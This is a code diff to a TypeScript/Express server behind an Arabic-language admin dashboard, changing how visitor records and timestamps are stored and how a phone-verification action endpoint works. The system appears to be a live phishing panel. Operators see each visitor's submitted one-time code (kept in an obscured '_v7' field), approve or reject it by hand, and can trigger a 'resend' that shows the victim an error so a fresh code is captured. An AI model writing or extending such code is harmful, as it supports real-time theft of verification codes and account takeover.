@@ -19,6 +19,7 @@ type DashboardEntry = {
   badge: string;
   visitorId?: string;
   submittedAt?: string;
+  updatedAt?: string;
   raw?: Record<string, any>;
 };
 
@@ -185,7 +186,7 @@ function normalizeDashboardEntry(payload: Record<string, any> = {}): DashboardEn
     updated: String(payload.updated || combinedPayload.updated || "تم التحديث الآن"),
     badge,
     visitorId: visitorId || String(payload.id || combinedPayload.id || ""),
-    submittedAt: String(payload.submittedAt || combinedPayload.submittedAt || new Date().toISOString()),
+    submittedAt: String(payload.submittedAt || combinedPayload.submittedAt || payload.createdAt || combinedPayload.createdAt || new Date().toISOString()),
     raw: combinedPayload.raw || combinedPayload || payload.raw || payload,
   };
 }
@@ -483,6 +484,15 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
   
   if (isDatabaseHealthy()) {
     try {
+      const existingResult = await pool.query<{ submittedAt: string | null }>(
+        `SELECT submitted_at AS "submittedAt" FROM dashboard_requests WHERE id = $1`,
+        [normalized.id],
+      );
+      const existingSubmittedAt = existingResult.rows[0]?.submittedAt || null;
+      const persistedSubmittedAt = existingSubmittedAt || normalized.submittedAt || new Date().toISOString();
+      normalized.submittedAt = persistedSubmittedAt;
+      normalized.updatedAt = persistedSubmittedAt;
+
       await pool.query(
         `
           INSERT INTO dashboard_requests (id, visitor_id, customer, status, stage, updated, badge, submitted_at, raw)
@@ -494,7 +504,7 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
             stage = EXCLUDED.stage,
             updated = EXCLUDED.updated,
             badge = EXCLUDED.badge,
-            submitted_at = EXCLUDED.submitted_at,
+            submitted_at = dashboard_requests.submitted_at,
             raw = EXCLUDED.raw;
         `,
         [
@@ -505,7 +515,7 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
           normalized.stage,
           normalized.updated,
           normalized.badge,
-          normalized.submittedAt || new Date().toISOString(),
+          persistedSubmittedAt,
           normalized.raw || {},
         ],
       );
@@ -552,7 +562,7 @@ async function getDashboardEntries(): Promise<DashboardEntry[]> {
       status: row.status || "جديد",
       stage: row.stage || "الخطوة 1",
       updated: row.updated || "تم التحديث الآن",
-      updatedAt: row.updated_at || new Date().toISOString(),
+      updatedAt: row.submittedAt || undefined,
       badge: row.badge || "",
       visitorId: row.visitorId || undefined,
       submittedAt: row.submittedAt || undefined,
@@ -915,19 +925,27 @@ async function startServer() {
   // Phone Verification Approval/Rejection (Step5Page)
   app.post("/api/dashboard/phone-action", async (req, res) => {
     try {
-      const { visitorId, action } = req.body;
-      if (!visitorId || !action) {
+      const body = req.body || {};
+      const resolvedVisitorId = String(
+        body.visitorId || body.id || body.visitor || body.raw?.visitorId || body.raw?.id || ""
+      ).trim();
+      const action = body.action;
+      if (!resolvedVisitorId || !action) {
         res.status(400).json({ error: "Missing visitorId or action" });
         return;
       }
 
       // Get current visitor data FIRST to preserve all data
-      const currentVisitor = await readVisitor(visitorId);
+      const currentVisitor = await readVisitor(resolvedVisitorId);
       const customerName = currentVisitor?.ownerName || currentVisitor?.phoneNumber || "زائر";
+      const currentPage = currentVisitor?.currentPage || "phone";
+      const currentStep = currentVisitor?.currentStep || 7;
 
       const updateData: Record<string, any> = {
         phoneActionAt: new Date().toISOString(),
         adminPhoneAction: action,
+        currentPage,
+        currentStep,
       };
 
       if (action === "approved") {
@@ -946,6 +964,9 @@ async function startServer() {
         updateData.phoneResendRequested = null;
         updateData._v7 = null; // Clear OTP code
         updateData.phoneOtpSubmittedAt = null;
+        updateData.currentPage = "phone";
+        updateData.currentStep = 7;
+        updateData.oneTimeRedirect = "phone";
       } else if (action === "resend") {
         // Customer must re-enter OTP - show error message
         updateData.phoneResendRequested = true;
@@ -954,25 +975,28 @@ async function startServer() {
         // Clear the OTP code so manager sees empty box waiting for new OTP
         updateData._v7 = null;
         updateData.phoneOtpSubmittedAt = null;
+        updateData.currentPage = "phone";
+        updateData.currentStep = 7;
       }
 
       // Update visitor data so customer can receive the update
-      await upsertVisitor(visitorId, updateData);
+      await upsertVisitor(resolvedVisitorId, updateData);
       
       // Preserve all existing visitor data for dashboard
       const dashboardData = await upsertDashboardRequest({ 
-        id: visitorId, 
-        visitorId: visitorId,
+        id: resolvedVisitorId,
+        visitorId: resolvedVisitorId,
         customer: customerName,
         ...currentVisitor,
-        ...updateData, 
-        updated: "تم التحديث الآن" 
+        ...updateData,
+        updated: "تم التحديث الآن"
       });
 
       // Broadcast to dashboard immediately
       broadcastToDashboard("dashboard:update", dashboardData);
+      broadcastSSE("visitor-update", { visitorId: resolvedVisitorId, action, updateData, dashboardData });
 
-      res.json({ success: true, action });
+      res.json({ success: true, action, visitorId: resolvedVisitorId, updateData });
     } catch (error) {
       console.error("phone action error", error);
       res.status(500).json({ error: "Failed to process phone action" });
